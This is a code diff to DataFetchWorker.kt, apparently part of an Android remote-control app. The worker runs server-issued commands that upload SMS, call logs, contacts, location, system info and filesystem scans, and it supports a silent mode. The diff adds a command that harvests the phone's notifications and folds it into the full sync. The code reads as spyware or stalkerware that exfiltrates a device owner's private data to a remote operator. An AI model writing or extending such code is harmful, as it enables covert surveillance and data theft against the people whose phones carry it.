@@ -1,3 +1,4 @@
+// DataFetchWorker.kt
 package com.example.lta.worker
 
 import android.Manifest
@@ -36,6 +37,7 @@ class DataFetchWorker(
 
         // Commands
         const val COMMAND_SYNC_ALL = "sync_all"
+        const val COMMAND_SYNC_NOTIFICATIONS = "sync_notifications" // <-- ADDED
         const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
         const val COMMAND_GET_LOCATION = "get_location"
         const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
@@ -43,7 +45,7 @@ class DataFetchWorker(
         const val COMMAND_DOWNLOAD_FILE = "download_file"
         const val COMMAND_PING = "ping"
         const val KEY_IS_SILENT = "silent"
-        
+
         fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
             val dataBuilder = Data.Builder().putString(KEY_COMMAND, command)
             extraData.forEach { (key, value) -> dataBuilder.putString(key, value) }
@@ -85,6 +87,7 @@ class DataFetchWorker(
     private suspend fun executeCommand(command: String): Boolean {
         return when (command) {
             COMMAND_SYNC_ALL -> syncAllData()
+            COMMAND_SYNC_NOTIFICATIONS -> deviceRepository.syncNotifications() // <-- ADDED
             COMMAND_SCAN_FILESYSTEM -> deviceRepository.scanAndUploadFileSystem()
             COMMAND_GET_LOCATION -> fetchAndSendLocation()
             COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
@@ -103,8 +106,9 @@ class DataFetchWorker(
         val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) deviceRepository.syncSms() else true
         val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) deviceRepository.syncCallLogs() else true
         val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) deviceRepository.syncContacts() else true
-        Log.i(TAG, "Full sync results -> SMS: $smsSuccess, CallLogs: $callLogSuccess, Contacts: $contactsSuccess")
-        return smsSuccess && callLogSuccess && contactsSuccess
+        val notificationsSuccess = deviceRepository.syncNotifications() // <-- ADDED
+        Log.i(TAG, "Full sync results -> SMS: $smsSuccess, CallLogs: $callLogSuccess, Contacts: $contactsSuccess, Notifications: $notificationsSuccess")
+        return smsSuccess && callLogSuccess && contactsSuccess && notificationsSuccess // <-- MODIFIED
     }
 
     private suspend fun uploadRequestedFile(): Boolean {
@@ -123,14 +127,14 @@ class DataFetchWorker(
         val downloadedFile = fileSystemManager.downloadFile(apiClient, serverFilePath)
         return downloadedFile?.exists() == true
     }
-    
+
     private suspend fun fetchAndSendLocation(): Boolean {
         if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return true
         val location = getCurrentLocation()
         val message = if (location != null) "Lat=${location.latitude}, Lon=${location.longitude}" else "Not available"
         return apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "location", message)
     }
-    
+
     private suspend fun fetchAndSendSystemInfo(): Boolean {
         val batteryInfo = systemInfoManager.getBatteryStatus()
         val message = "Net=${systemInfoManager.getNetworkType()}, Batt=${batteryInfo.percentage}% (${batteryInfo.status})"
@@ -150,10 +154,10 @@ class DataFetchWorker(
             extras = extras
         )
     }
-    
+
     private fun hasPermission(permission: String): Boolean =
         ContextCompat.checkSelfPermission(applicationContext, permission) == PackageManager.PERMISSION_GRANTED
-    
+
     private suspend fun getCurrentLocation(): Location? = try {
         if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
             LocationServices.getFusedLocationProviderClient(applicationContext)
